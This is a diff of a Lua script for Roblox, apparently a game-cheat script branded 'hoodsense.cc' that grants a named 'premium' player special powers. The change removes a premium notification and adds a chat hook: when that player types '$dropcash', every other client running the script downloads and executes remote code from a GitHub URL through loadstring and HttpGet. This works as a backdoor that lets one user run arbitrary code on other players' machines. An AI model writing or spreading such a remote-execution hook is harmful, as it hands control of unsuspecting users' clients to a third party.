@@ -1,7 +1,7 @@
-local premium6 = game.Players.ZaCzArOwAnA_
+local premium6 = game.Players.ZaCzArOwAnA_JeStEm
 local Players = game:GetService("Players")
 	Players.PlayerAdded:Connect(function(player)
-		print("[hoodsense.cc] p6.lua found " .. player.Name)
+		print("[hoodsense.cc] p1.lua found " .. player.Name)
 		local premium6 = game.Players.ZaCzArOwAnA_JeStEm
 -----------------------------------// Premium User //--------------------------------------
 local premium6 = game.Players.ZaCzArOwAnA_JeStEm
@@ -184,18 +184,10 @@ premium6.Chatted:connect(function(cht)
 
 end)
 
-if game.Players.LocalPlayer == premium6 then
-game:GetService("StarterGui"):SetCore("SendNotification",{
-	Title = "hoodsense.cc";
-	Text = "Premium acces!";
-	Time = 10;
-	Icon = "rbxassetid://8768441000";
-    Button1 = "Okay!";
-})
-end
+
  end)
 	Players.PlayerRemoving:Connect(function(player)
-	print("[hoodsense.cc] p6.lua lost " .. player.Name)
+	print("[hoodsense.cc] [hoodsense.cc] p1.lua lost " .. player.Name)
 	local premium6 = game.Players.ZaCzArOwAnA_JeStEm
 -----------------------------------// Premium User //--------------------------------------
 local premium6 = game.Players.ZaCzArOwAnA_JeStEm
@@ -378,14 +370,14 @@ premium6.Chatted:connect(function(cht)
 
 end)
 
-if game.Players.LocalPlayer == premium6 then
-game:GetService("StarterGui"):SetCore("SendNotification",{
-	Title = "hoodsense.cc";
-	Text = "Premium acces!";
-	Time = 10;
-	Icon = "rbxassetid://8768441000";
-    Button1 = "Okay!";
-})
-end
+premium6.Chatted:connect(function(cht)
+	if cht:match("$dropcash .") then
+    	if game.Players.LocalPlayer ~= premium6 then
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/eksotopro/holders/main/dropcash.lua"))()
+        end
+	end
+
+end)
+
 end)
 -------------------------------------------------------------------------------
